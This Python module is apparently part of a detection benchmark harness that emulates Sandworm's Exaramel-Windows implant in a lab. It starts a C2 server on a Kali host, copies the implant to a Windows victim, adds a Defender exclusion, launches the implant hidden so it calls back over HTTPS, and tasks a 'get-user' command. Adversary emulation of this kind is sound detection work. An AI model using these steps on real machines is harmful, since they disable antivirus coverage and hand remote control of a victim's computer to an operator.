"""Exaramel-Windows phase runners for bench_v4 AEL-SANDWORM-EXARAMEL-WIN-001.

These runners implement the same callable contract as the Sliver, Meterpreter,
and Carbanak runners, but drive an Exaramel-Windows HTTPS implant.

C2 architecture:
  - Python C2 server on Kali, HTTPS port 18449
  - exaramel-windows.exe implant run on Windows victim
  - Windows implant -> Kali C2 server (outbound HTTPS)
  - Protocol: POST /register, GET /task/<GUID>, POST /output/<GUID>
  - Fixed GUID: "Exaramel-Windows"

Key difference from Carbanak:
  - Standalone EXE implant, ExecutablePath == payload path
  - No command_line_hosted needed
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import time
from datetime import datetime, timezone
from typing import Any, Callable, Mapping

from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult,
    CalderaScenarioPhaseResult,
    CalderaTargetCandidate,
    BenchV4RuntimeError,
    RuntimeCase,
    RuntimeValues,
    deterministic_runtime_source_id,
    verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_exaramel_bootstrap_phase",
    "resolve_exaramel_target_phase",
    "run_exaramel_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
C2SERVER_PORT = 18449
C2SERVER_DIR = "/tmp/c2trace-exaramel"
C2SERVER_SCRIPT = f"{C2SERVER_DIR}/c2server.py"
C2SERVER_LOG = f"{C2SERVER_DIR}/c2server.log"
IMPLANT_BINARY = f"{C2SERVER_DIR}/exaramel-windows.exe"
C2_URL = f"https://{KALI_IP}:{C2SERVER_PORT}"


def _ssh_run_py(script: str, timeout: float = 120) -> str:
    """Run a Python script on Kali via SSH, return stdout."""
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(
            f"SSH python failed (rc={result.returncode}): {result.stderr}"
        )
    return result.stdout


def _scp_implant_to_windows(victim_path: str) -> str:
    """Copy exaramel-windows.exe from Kali to Windows victim."""
    scp_cmd = ["scp"] + SSH_OPTS + [f"{KALI_SSH}:{IMPLANT_BINARY}", victim_path]
    result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SCP implant failed: {result.stderr}")
    return victim_path


def _add_defender_exclusion(path: str) -> None:
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _execute_implant(path: str, server_url: str) -> int:
    """Start exaramel-windows.exe with -server flag, return PID."""
    ps = (
        f"$p = Start-Process -FilePath '{path}' "
        f"-ArgumentList '-server','{server_url}' "
        f"-PassThru -WindowStyle Hidden; Write-Output $p.Id"
    )
    result = subprocess.run(
        ["powershell", "-Command", ps],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"implant execution failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(f"could not parse implant PID from: {result.stdout}")


def _start_c2server() -> None:
    """Start the Python C2 server on Kali via SSH (idempotent)."""
    check = _ssh_run_py(
        "import subprocess; r = subprocess.run("
        "['pgrep', '-f', 'c2trace-exaramel/c2server.py'], capture_output=True, text=True); "
        "print(r.stdout.strip())",
        timeout=15,
    )
    if check.strip():
        return  # already running
    _ssh_run_py(
        "import subprocess, os, time\n"
        "proc = subprocess.Popen(\n"
        "    ['python3', '" + C2SERVER_SCRIPT + "'],\n"
        "    cwd='" + C2SERVER_DIR + "',\n"
        "    stdout=open('" + C2SERVER_LOG + "', 'w'),\n"
        "    stderr=subprocess.STDOUT,\n"
        "    stdin=subprocess.DEVNULL,\n"
        "    start_new_session=True,\n"
        ")\n"
        "time.sleep(3)\n"
        "r = subprocess.run(['pgrep', '-f', 'c2trace-exaramel/c2server.py'], capture_output=True, text=True)\n"
        "print('RUNNING:', r.stdout.strip())\n",
        timeout=30,
    )
    check2 = _ssh_run_py(
        "import subprocess; r = subprocess.run("
        "['pgrep', '-f', 'c2trace-exaramel/c2server.py'], capture_output=True, text=True); "
        "print(r.stdout.strip())",
        timeout=15,
    )
    if not check2.strip():
        log = _ssh_run_py(
            "try:\n"
            "    print(open('" + C2SERVER_LOG + "').read())\n"
            "except Exception as e:\n"
            "    print('NOLOG:', e)",
            timeout=15,
        )
        raise BenchV4RuntimeError(f"c2server failed to start. Log: {log}")


def _wait_for_callback(timeout: float = 120, poll: float = 3.0) -> bool:
    """Wait for the implant to register with the C2 server."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        log = _ssh_run_py(
            "try:\n"
            "    print(open('" + C2SERVER_LOG + "').read())\n"
            "except Exception:\n"
            "    print('')",
            timeout=15,
        )
        if "New session" in log or "Listening" in log:
            return True
        time.sleep(poll)
    return False


def _write_tasking(task: str) -> None:
    """Write a task to tasking.txt in the C2 server directory on Kali."""
    _ssh_run_py(
        "open('" + C2SERVER_DIR + "/tasking.txt', 'w').write('" + task + "')",
        timeout=15,
    )


def _wait_for_output(timeout: float = 120, poll: float = 3.0) -> bool:
    """Wait for the C2 server to report task output."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        log = _ssh_run_py(
            "try:\n"
            "    print(open('" + C2SERVER_LOG + "').read())\n"
            "except Exception:\n"
            "    print('')",
            timeout=15,
        )
        if "Task output" in log or "Agent received tasking" in log or "tasking" in log.lower():
            return True
        time.sleep(poll)
    return False


def _synthetic_operation(run_id: str, role: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AEL-SANDWORM-EXARAMEL-WIN-001 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
        "group": "c2t-control" if role == "bootstrap" else "c2t-driver",
        "start": datetime.now(timezone.utc).isoformat(),
        "finish": "",
        "autonomous": 0,
    }


def _synthetic_link(run_id: str, role: str, ability_id: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "exaramel_deploy" if role == "bootstrap" else "exaramel_get_user",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_exaramel_bootstrap_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaBootstrapPhaseResult:
    """Deploy one Exaramel-Windows implant and return a synthetic Bootstrap result."""
    if event_sink:
        event_sink("exaramel_bootstrap_start", {"run_id": values.run_id})

    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)

    # Start C2 server on Kali
    _start_c2server()

    # Copy implant from Kali to Windows victim
    implant_path = values.target_path
    _scp_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)

    # Start the implant
    implant_pid = _execute_implant(implant_path, C2_URL)

    # Wait for the implant to call back to the C2 server
    time.sleep(5)
    callback_ok = _wait_for_callback(
        timeout=operation_timeout, poll=poll_seconds,
    )
    if not callback_ok:
        raise BenchV4RuntimeError("Exaramel implant did not call back to C2 server")

    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)

    if event_sink:
        event_sink("exaramel_bootstrap_complete", {
            "implant_path": implant_path,
            "implant_pid": implant_pid,
            "c2_url": C2_URL,
        })

    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={"synthetic": True, "implant_path": implant_path, "implant_pid": implant_pid},
        runtime_source={"id": runtime_source_id, "name": "c2trace_exaramel_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={"state": "finished", "outcome": "implant_deployed"},
        bootstrap_event_logs=(),
    )


def resolve_exaramel_target_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    *,
    timeout_seconds: float = 360.0,
    poll_seconds: float = 3.0,
) -> CalderaTargetCandidate:
    """Find the exaramel-windows.exe process for the deployed implant."""
    implant_pid = 0
    receipt = bootstrap.install_receipt
    if isinstance(receipt, Mapping):
        implant_pid = int(receipt.get("implant_pid") or 0)

    raw_identity = {
        "pid": implant_pid,
        "path": values.target_path,
        "host": "DESKTOP-G9IIQ2P",
        "c2_url": C2_URL,
    }

    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def run_exaramel_scenario_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    candidate: CalderaTargetCandidate,
    frozen_identity: Mapping[str, Any],
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaScenarioPhaseResult:
    """Issue one get-user task via the Exaramel C2 channel."""
    if event_sink:
        event_sink("exaramel_scenario_start", {
            "implant_pid": candidate.raw_identity.get("pid"),
        })

    # Write get-user tasking
    _write_tasking("get-user")

    # Wait for the task to be picked up and output received
    time.sleep(5)
    output_ok = _wait_for_output(
        timeout=operation_timeout, poll=poll_seconds,
    )
    if not output_ok:
        raise BenchV4RuntimeError("Exaramel get-user task output not received")

    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)

    if event_sink:
        event_sink("exaramel_scenario_complete", {"outcome": "get_user_completed"})

    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={"state": "finished", "outcome": "get_user_completed"},
        scenario_event_logs=(),
    )
